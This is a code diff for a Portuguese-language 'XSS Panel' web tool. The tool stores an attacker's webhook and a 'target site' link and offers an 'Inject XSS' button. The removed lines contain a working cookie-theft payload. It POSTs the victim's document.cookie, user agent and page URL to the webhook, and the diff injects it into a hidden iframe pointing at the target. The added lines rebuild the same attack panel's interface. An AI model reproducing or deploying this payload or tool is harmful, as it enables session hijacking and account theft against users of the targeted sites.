@@ -1,45 +1,32 @@
-<button id="xssBtn">Injetar XSS</button>
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <title>XSS Panel do DK</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h1 class="titulo">Painel XSS - DKZIN</h1>
 
-<script>
-  document.getElementById("xssBtn").addEventListener("click", () => {
-    const site = localStorage.getItem('xssSite');
-    const webhook = localStorage.getItem('xssWebhook');
+    <section class="card">
+      <h2>Salvar Webhook</h2>
+      <input id="webhookInput" type="text" placeholder="Cole seu webhook aqui">
+      <button onclick="saveWebhook()">Salvar Webhook</button>
+    </section>
 
-    if (!site || !webhook) return alert("Site ou Webhook não configurado!");
+    <section class="card">
+      <h2>Salvar Link do Site</h2>
+      <input id="siteInput" type="text" placeholder="Cole o link do site alvo aqui">
+      <button onclick="saveSite()">Salvar Site</button>
+    </section>
 
-    // Simula iframe apontando pro site alvo
-    const iframe = document.createElement('iframe');
-    iframe.style.display = "none";
-    iframe.src = site;
+    <section class="card">
+      <h2>Executar XSS</h2>
+      <button id="xssBtn">Injetar XSS</button>
+    </section>
+  </div>
 
-    // Exemplo de payload XSS
-    const payload = `
-      <script>
-        fetch('${webhook}', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            cookie: document.cookie,
-            userAgent: navigator.userAgent,
-            location: window.location.href
-          })
-        });
-      <\/script>
-    `;
-
-    // Injeta o script (isso só funcionaria se o site alvo estiver vulnerável e permitir `<iframe>` + `document.write`)
-    iframe.onload = () => {
-      try {
-        const frameDoc = iframe.contentWindow.document;
-        frameDoc.open();
-        frameDoc.write(payload);
-        frameDoc.close();
-        alert("Payload injetado.");
-      } catch (err) {
-        alert("Não foi possível injetar. Provavelmente CORS ou site protegido.");
-      }
-    };
-
-    document.body.appendChild(iframe);
-  });
-</script>
+  <script src="main.js"></script>
+</body>
+</html>
